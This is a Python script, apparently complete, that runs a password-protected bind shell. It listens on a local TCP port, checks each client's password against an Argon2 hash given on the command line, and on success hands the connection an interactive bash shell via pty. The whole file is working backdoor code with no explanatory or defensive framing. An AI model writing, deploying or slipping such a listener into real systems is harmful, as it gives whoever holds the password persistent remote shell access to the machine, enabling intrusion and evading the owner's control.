import socket
import os
import pty
import sys
from argon2 import PasswordHasher, exceptions


ph = PasswordHasher()
stored_hash = str(sys.argv[1])
HOST = "127.0.0.1"
PORT = 16139



def verify_password(password):
    global stored_hash
    try:
        ph.verify(stored_hash, password)
        return True
    except exceptions.VerifyMismatchError:
        return False



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)


while True:
    conn, addr = server.accept()

    conn.sendall(b"Enter password: ")
    recv_pass = conn.recv(1024).decode().strip()

    if verify_password(recv_pass):
        conn.sendall(b"Access granted!\n")
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)
        pty.spawn("/bin/bash")
    else:
        conn.sendall(b"Access denied!\n")
        conn.close()
